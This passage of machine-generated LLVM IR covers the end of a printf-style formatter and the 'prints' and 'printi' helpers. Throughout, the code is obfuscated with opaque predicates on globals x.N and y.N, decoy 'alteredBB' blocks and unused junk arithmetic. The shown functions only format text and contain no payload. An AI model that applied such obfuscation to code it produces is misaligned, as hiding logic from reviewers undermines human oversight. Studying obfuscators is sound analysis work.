  br i1 %310, label %311, label %352

; <label>:311:                                    ; preds = %306
  %312 = load i8**, i8*** %4, align 8
  %313 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %314 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 8
  %316 = icmp ule i32 %315, 40
  br i1 %316, label %317, label %339

; <label>:317:                                    ; preds = %311
  %318 = load i32, i32* @x.7
  %319 = load i32, i32* @y.8
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %317
  %326 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %313, i32 0, i32 3
  %327 = load i8*, i8** %326, align 8
  %328 = getelementptr i8, i8* %327, i32 %315
  %329 = bitcast i8* %328 to i32*
  %330 = add i32 %315, 8
  store i32 %330, i32* %314, align 8
  %331 = load i32, i32* @x.7
  %332 = load i32, i32* @y.8
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBBpart241, label %originalBB30alteredBB

originalBBpart241:                                ; preds = %originalBB30
  br label %344

; <label>:339:                                    ; preds = %311
  %340 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %313, i32 0, i32 2
  %341 = load i8*, i8** %340, align 8
  %342 = bitcast i8* %341 to i32*
  %343 = getelementptr i8, i8* %341, i32 8
  store i8* %343, i8** %340, align 8
  br label %344

; <label>:344:                                    ; preds = %339, %originalBBpart241
  %345 = phi i32* [ %329, %originalBBpart241 ], [ %342, %339 ]
  %346 = load i32, i32* %345, align 4
  %347 = load i32, i32* %7, align 4
  %348 = load i32, i32* %8, align 4
  %349 = call i32 @printi(i8** %312, i32 %346, i32 16, i32 0, i32 %347, i32 %348, i32 65)
  %350 = load i32, i32* %9, align 4
  %351 = add nsw i32 %350, %349
  store i32 %351, i32* %9, align 4
  br label %474

; <label>:352:                                    ; preds = %306
  %353 = load i8*, i8** %5, align 8
  %354 = load i8, i8* %353, align 1
  %355 = zext i8 %354 to i32
  %356 = icmp eq i32 %355, 117
  br i1 %356, label %357, label %398

; <label>:357:                                    ; preds = %352
  %358 = load i8**, i8*** %4, align 8
  %359 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %360 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %359, i32 0, i32 0
  %361 = load i32, i32* %360, align 8
  %362 = icmp ule i32 %361, 40
  br i1 %362, label %363, label %369

; <label>:363:                                    ; preds = %357
  %364 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %359, i32 0, i32 3
  %365 = load i8*, i8** %364, align 8
  %366 = getelementptr i8, i8* %365, i32 %361
  %367 = bitcast i8* %366 to i32*
  %368 = add i32 %361, 8
  store i32 %368, i32* %360, align 8
  br label %390

; <label>:369:                                    ; preds = %357
  %370 = load i32, i32* @x.7
  %371 = load i32, i32* @y.8
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %369
  %378 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %359, i32 0, i32 2
  %379 = load i8*, i8** %378, align 8
  %380 = bitcast i8* %379 to i32*
  %381 = getelementptr i8, i8* %379, i32 8
  store i8* %381, i8** %378, align 8
  %382 = load i32, i32* @x.7
  %383 = load i32, i32* @y.8
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %390

; <label>:390:                                    ; preds = %originalBBpart245, %363
  %391 = phi i32* [ %367, %363 ], [ %380, %originalBBpart245 ]
  %392 = load i32, i32* %391, align 4
  %393 = load i32, i32* %7, align 4
  %394 = load i32, i32* %8, align 4
  %395 = call i32 @printi(i8** %358, i32 %392, i32 10, i32 0, i32 %393, i32 %394, i32 97)
  %396 = load i32, i32* %9, align 4
  %397 = add nsw i32 %396, %395
  store i32 %397, i32* %9, align 4
  br label %474

; <label>:398:                                    ; preds = %352
  %399 = load i8*, i8** %5, align 8
  %400 = load i8, i8* %399, align 1
  %401 = zext i8 %400 to i32
  %402 = icmp eq i32 %401, 99
  br i1 %402, label %403, label %432

; <label>:403:                                    ; preds = %398
  %404 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %405 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %404, i32 0, i32 0
  %406 = load i32, i32* %405, align 8
  %407 = icmp ule i32 %406, 40
  br i1 %407, label %408, label %414

; <label>:408:                                    ; preds = %403
  %409 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %404, i32 0, i32 3
  %410 = load i8*, i8** %409, align 8
  %411 = getelementptr i8, i8* %410, i32 %406
  %412 = bitcast i8* %411 to i32*
  %413 = add i32 %406, 8
  store i32 %413, i32* %405, align 8
  br label %419

; <label>:414:                                    ; preds = %403
  %415 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %404, i32 0, i32 2
  %416 = load i8*, i8** %415, align 8
  %417 = bitcast i8* %416 to i32*
  %418 = getelementptr i8, i8* %416, i32 8
  store i8* %418, i8** %415, align 8
  br label %419

; <label>:419:                                    ; preds = %414, %408
  %420 = phi i32* [ %412, %408 ], [ %417, %414 ]
  %421 = load i32, i32* %420, align 4
  %422 = trunc i32 %421 to i8
  %423 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %422, i8* %423, align 1
  %424 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %424, align 1
  %425 = load i8**, i8*** %4, align 8
  %426 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %427 = load i32, i32* %7, align 4
  %428 = load i32, i32* %8, align 4
  %429 = call i32 @prints(i8** %425, i8* %426, i32 %427, i32 %428)
  %430 = load i32, i32* %9, align 4
  %431 = add nsw i32 %430, %429
  store i32 %431, i32* %9, align 4
  br label %474

; <label>:432:                                    ; preds = %398
  br label %473

; <label>:433:                                    ; preds = %33
  %434 = load i32, i32* @x.7
  %435 = load i32, i32* @y.8
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %433
  %442 = load i32, i32* @x.7
  %443 = load i32, i32* @y.8
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %450

; <label>:450:                                    ; preds = %originalBBpart249, %51
  %451 = load i32, i32* @x.7
  %452 = load i32, i32* @y.8
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %450
  %459 = load i8**, i8*** %4, align 8
  %460 = load i8*, i8** %5, align 8
  %461 = load i8, i8* %460, align 1
  %462 = zext i8 %461 to i32
  call void @printchar(i8** %459, i32 %462)
  %463 = load i32, i32* %9, align 4
  %464 = add nsw i32 %463, 1
  store i32 %464, i32* %9, align 4
  %465 = load i32, i32* @x.7
  %466 = load i32, i32* @y.8
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBBpart266, label %originalBB51alteredBB

originalBBpart266:                                ; preds = %originalBB51
  br label %473

; <label>:473:                                    ; preds = %originalBBpart266, %432
  br label %474

; <label>:474:                                    ; preds = %473, %419, %390, %344, %originalBBpart228, %236, %191
  %475 = load i8*, i8** %5, align 8
  %476 = getelementptr inbounds i8, i8* %475, i32 1
  store i8* %476, i8** %5, align 8
  br label %12

; <label>:477:                                    ; preds = %45, %originalBBpart2
  %478 = load i8**, i8*** %4, align 8
  %479 = icmp ne i8** %478, null
  br i1 %479, label %480, label %483

; <label>:480:                                    ; preds = %477
  %481 = load i8**, i8*** %4, align 8
  %482 = load i8*, i8** %481, align 8
  store i8 0, i8* %482, align 1
  br label %483

; <label>:483:                                    ; preds = %480, %477
  %484 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %485 = bitcast %struct.__va_list_tag* %484 to i8*
  call void @llvm.va_end(i8* %485)
  %486 = load i32, i32* %9, align 4
  ret i32 %486

originalBBalteredBB:                              ; preds = %originalBB, %12
  %487 = load i8*, i8** %5, align 8
  %488 = load i8, i8* %487, align 1
  %489 = zext i8 %488 to i32
  %490 = icmp ne i32 %489, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %57
  %491 = load i8*, i8** %5, align 8
  %492 = getelementptr inbounds i8, i8* %491, i32 1
  store i8* %492, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %128
  %493 = load i8*, i8** %5, align 8
  %494 = load i8, i8* %493, align 1
  %495 = zext i8 %494 to i32
  %496 = icmp eq i32 %495, 115
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %160
  %497 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 2
  %498 = load i8*, i8** %497, align 8
  %499 = bitcast i8* %498 to i64*
  %500 = getelementptr i8, i8* %498, i32 8
  store i8* %500, i8** %497, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %215
  %501 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %205, i32 0, i32 2
  %502 = load i8*, i8** %501, align 8
  %503 = bitcast i8* %502 to i32*
  %504 = getelementptr i8, i8* %502, i32 8
  store i8* %504, i8** %501, align 8
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %249
  %505 = load i8**, i8*** %4, align 8
  %506 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %507 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %506, i32 0, i32 0
  %508 = load i32, i32* %507, align 8
  %509 = icmp ule i32 %508, 40
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %282
  %510 = load i32, i32* %283, align 4
  %511 = load i32, i32* %7, align 4
  %512 = load i32, i32* %8, align 4
  %513 = call i32 @printi(i8** %258, i32 %510, i32 16, i32 0, i32 %511, i32 %512, i32 97)
  %514 = load i32, i32* %9, align 4
  %_ = shl i32 %514, %513
  %515 = add nsw i32 %514, %513
  store i32 %515, i32* %9, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %317
  %516 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %313, i32 0, i32 3
  %517 = load i8*, i8** %516, align 8
  %518 = getelementptr i8, i8* %517, i32 %315
  %519 = bitcast i8* %518 to i32*
  %_31 = sub i32 0, %315
  %gen = add i32 %_31, 8
  %_32 = shl i32 %315, 8
  %_33 = sub i32 %315, 8
  %gen34 = mul i32 %_33, 8
  %_35 = sub i32 0, %315
  %gen36 = add i32 %_35, 8
  %_37 = sub i32 %315, 8
  %gen38 = mul i32 %_37, 8
  %_39 = shl i32 %315, 8
  %520 = add i32 %315, 8
  store i32 %520, i32* %314, align 8
  br label %originalBB30

originalBB43alteredBB:                            ; preds = %originalBB43, %369
  %521 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %359, i32 0, i32 2
  %522 = load i8*, i8** %521, align 8
  %523 = bitcast i8* %522 to i32*
  %524 = getelementptr i8, i8* %522, i32 8
  store i8* %524, i8** %521, align 8
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %433
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %450
  %525 = load i8**, i8*** %4, align 8
  %526 = load i8*, i8** %5, align 8
  %527 = load i8, i8* %526, align 1
  %528 = zext i8 %527 to i32
  call void @printchar(i8** %525, i32 %528)
  %529 = load i32, i32* %9, align 4
  %_52 = shl i32 %529, 1
  %_53 = sub i32 %529, 1
  %gen54 = mul i32 %_53, 1
  %_55 = shl i32 %529, 1
  %_56 = sub i32 %529, 1
  %gen57 = mul i32 %_56, 1
  %_58 = shl i32 %529, 1
  %_59 = sub i32 %529, 1
  %gen60 = mul i32 %_59, 1
  %_61 = sub i32 %529, 1
  %gen62 = mul i32 %_61, 1
  %_63 = sub i32 0, %529
  %gen64 = add i32 %_63, 1
  %530 = add nsw i32 %529, 1
  store i32 %530, i32* %9, align 4
  br label %originalBB51
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %74

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %40, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %43

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* @x.9
  %23 = load i32, i32* @y.10
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* %11, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %11, align 4
  %32 = load i32, i32* @x.9
  %33 = load i32, i32* @y.10
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i8*, i8** %12, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %12, align 8
  br label %17

; <label>:43:                                     ; preds = %17
  %44 = load i32, i32* %11, align 4
  %45 = load i32, i32* %7, align 4
  %46 = icmp sge i32 %44, %45
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* @x.9
  %49 = load i32, i32* @y.10
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  store i32 0, i32* %7, align 4
  %56 = load i32, i32* @x.9
  %57 = load i32, i32* @y.10
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %68

; <label>:64:                                     ; preds = %43
  %65 = load i32, i32* %11, align 4
  %66 = load i32, i32* %7, align 4
  %67 = sub nsw i32 %66, %65
  store i32 %67, i32* %7, align 4
  br label %68

; <label>:68:                                     ; preds = %64, %originalBBpart24
  %69 = load i32, i32* %8, align 4
  %70 = and i32 %69, 2
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %68
  store i32 48, i32* %10, align 4
  br label %73

; <label>:73:                                     ; preds = %72, %68
  br label %74

; <label>:74:                                     ; preds = %73, %4
  %75 = load i32, i32* @x.9
  %76 = load i32, i32* @y.10
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = load i32, i32* %8, align 4
  %84 = and i32 %83, 1
  %85 = icmp ne i32 %84, 0
  %86 = load i32, i32* @x.9
  %87 = load i32, i32* @y.10
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart223, label %originalBB6alteredBB

originalBBpart223:                                ; preds = %originalBB6
  br i1 %85, label %107, label %94

; <label>:94:                                     ; preds = %originalBBpart223
  br label %95

; <label>:95:                                     ; preds = %103, %94
  %96 = load i32, i32* %7, align 4
  %97 = icmp sgt i32 %96, 0
  br i1 %97, label %98, label %106

; <label>:98:                                     ; preds = %95
  %99 = load i8**, i8*** %5, align 8
  %100 = load i32, i32* %10, align 4
  call void @printchar(i8** %99, i32 %100)
  %101 = load i32, i32* %9, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %9, align 4
  br label %103

; <label>:103:                                    ; preds = %98
  %104 = load i32, i32* %7, align 4
  %105 = add nsw i32 %104, -1
  store i32 %105, i32* %7, align 4
  br label %95

; <label>:106:                                    ; preds = %95
  br label %107

; <label>:107:                                    ; preds = %106, %originalBBpart223
  br label %108

; <label>:108:                                    ; preds = %originalBBpart227, %107
  %109 = load i8*, i8** %6, align 8
  %110 = load i8, i8* %109, align 1
  %111 = icmp ne i8 %110, 0
  br i1 %111, label %112, label %138

; <label>:112:                                    ; preds = %108
  %113 = load i8**, i8*** %5, align 8
  %114 = load i8*, i8** %6, align 8
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i32
  call void @printchar(i8** %113, i32 %116)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %9, align 4
  br label %119

; <label>:119:                                    ; preds = %112
  %120 = load i32, i32* @x.9
  %121 = load i32, i32* @y.10
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %119
  %128 = load i8*, i8** %6, align 8
  %129 = getelementptr inbounds i8, i8* %128, i32 1
  store i8* %129, i8** %6, align 8
  %130 = load i32, i32* @x.9
  %131 = load i32, i32* @y.10
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %108

; <label>:138:                                    ; preds = %108
  %139 = load i32, i32* @x.9
  %140 = load i32, i32* @y.10
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %138
  %147 = load i32, i32* @x.9
  %148 = load i32, i32* @y.10
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %155

; <label>:155:                                    ; preds = %originalBBpart243, %originalBBpart231
  %156 = load i32, i32* %7, align 4
  %157 = icmp sgt i32 %156, 0
  br i1 %157, label %158, label %182

; <label>:158:                                    ; preds = %155
  %159 = load i8**, i8*** %5, align 8
  %160 = load i32, i32* %10, align 4
  call void @printchar(i8** %159, i32 %160)
  %161 = load i32, i32* %9, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %9, align 4
  br label %163

; <label>:163:                                    ; preds = %158
  %164 = load i32, i32* @x.9
  %165 = load i32, i32* @y.10
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %163
  %172 = load i32, i32* %7, align 4
  %173 = add nsw i32 %172, -1
  store i32 %173, i32* %7, align 4
  %174 = load i32, i32* @x.9
  %175 = load i32, i32* @y.10
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart243, label %originalBB33alteredBB

originalBBpart243:                                ; preds = %originalBB33
  br label %155

; <label>:182:                                    ; preds = %155
  %183 = load i32, i32* %9, align 4
  ret i32 %183

originalBBalteredBB:                              ; preds = %originalBB, %21
  %184 = load i32, i32* %11, align 4
  %_ = sub i32 %184, 1
  %gen = mul i32 %_, 1
  %185 = add nsw i32 %184, 1
  store i32 %185, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  store i32 0, i32* %7, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  %186 = load i32, i32* %8, align 4
  %_7 = shl i32 %186, 1
  %_8 = sub i32 %186, 1
  %gen9 = mul i32 %_8, 1
  %_10 = shl i32 %186, 1
  %_11 = shl i32 %186, 1
  %_12 = sub i32 %186, 1
  %gen13 = mul i32 %_12, 1
  %_14 = sub i32 0, %186
  %gen15 = add i32 %_14, 1
  %_16 = sub i32 %186, 1
  %gen17 = mul i32 %_16, 1
  %_18 = sub i32 0, %186
  %gen19 = add i32 %_18, 1
  %_20 = sub i32 0, %186
  %gen21 = add i32 %_20, 1
  %187 = and i32 %186, 1
  %188 = icmp ne i32 %187, 0
  br label %originalBB6

originalBB25alteredBB:                            ; preds = %originalBB25, %119
  %189 = load i8*, i8** %6, align 8
  %190 = getelementptr inbounds i8, i8* %189, i32 1
  store i8* %190, i8** %6, align 8
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %138
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %163
  %191 = load i32, i32* %7, align 4
  %_34 = sub i32 0, %191
  %gen35 = add i32 %_34, -1
  %_36 = sub i32 0, %191
  %gen37 = add i32 %_36, -1
  %_38 = sub i32 0, %191
  %gen39 = add i32 %_38, -1
  %_40 = sub i32 0, %191
  %gen41 = add i32 %_40, -1
  %192 = add nsw i32 %191, -1
  store i32 %192, i32* %7, align 4
  br label %originalBB33
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %182

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* @x.11
  %35 = load i32, i32* @y.12
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %12, align 4
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.11
  %45 = load i32, i32* @y.12
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %77

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* %11, align 4
  %54 = icmp eq i32 %53, 10
  br i1 %54, label %55, label %77

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* @x.11
  %57 = load i32, i32* @y.12
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i32, i32* %10, align 4
  %65 = icmp slt i32 %64, 0
  %66 = load i32, i32* @x.11
  %67 = load i32, i32* @y.12
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %74, label %77

; <label>:74:                                     ; preds = %originalBBpart24
  store i32 1, i32* %19, align 4
  %75 = load i32, i32* %10, align 4
  %76 = sub nsw i32 0, %75
  store i32 %76, i32* %21, align 4
  br label %77

; <label>:77:                                     ; preds = %74, %originalBBpart24, %52, %originalBBpart2
  %78 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %79 = getelementptr inbounds i8, i8* %78, i64 12
  %80 = getelementptr inbounds i8, i8* %79, i64 -1
  store i8* %80, i8** %17, align 8
  %81 = load i8*, i8** %17, align 8
  store i8 0, i8* %81, align 1
  br label %82

; <label>:82:                                     ; preds = %originalBBpart227, %77
  %83 = load i32, i32* @x.11
  %84 = load i32, i32* @y.12
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %82
  %91 = load i32, i32* %21, align 4
  %92 = icmp ne i32 %91, 0
  %93 = load i32, i32* @x.11
  %94 = load i32, i32* @y.12
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %92, label %101, label %138

